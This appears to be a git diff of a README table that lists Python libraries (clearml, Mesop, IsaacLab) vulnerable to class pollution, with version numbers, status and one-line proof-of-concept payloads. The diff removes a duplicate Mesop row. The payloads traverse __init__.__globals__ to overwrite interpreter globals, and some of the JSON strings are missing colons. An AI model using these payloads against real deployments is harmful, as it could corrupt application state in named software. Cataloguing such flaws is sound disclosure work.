@@ -6,7 +6,6 @@ This repository contains a list of packages that are vulnerable to class polluti
 
 | Library | Stars | Version | Payloads | Found By | Status | CVE |
 |:-------:|:-----:|:-------:|----------|:--------:|:------:|:---:|
-| [Mesop](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/nicegui/README.md) | 5.7K | v0.13.0 | ```mesop.dataclass_utils.dataclass_utils.update_dataclass_from_json(obj, '{"__init__"{"__globals__"{"__name__""polluted"}}}')``` | BlackPyrl | Pending | N/A |
 | [clearml](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/clearml/README.md) | 5.7K | v1.16.5 | ```clearml.automation.TaskScheduler.add_task(task_overrides={'__init__.__globals__.__builtins__.getattr''polluted'})``` | BlackPyrl | Pending | N/A |
 | [Mesop](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/mesop/README.md) | 5.7K | v0.13.0 | ```mesop.dataclass_utils.dataclass_utils.update_dataclass_from_json(obj, '{"__init__"{"__globals__"{"__name__""polluted"}}}')``` | BlackPyrl | Pending | N/A |
 | [IssacLab](https://github.com/jackfromeast/python-class-pollution/blob/main/class-pollution/issaclab/README.md) | 2.5K | v1.4.0 | ```omni.isaac.lab.utils.dict.update_class_from_dict(obj, {'__init__':{'__globals__':{'__name__':"polluted"}}})``` | BlackPyrl | Pending | N/A |
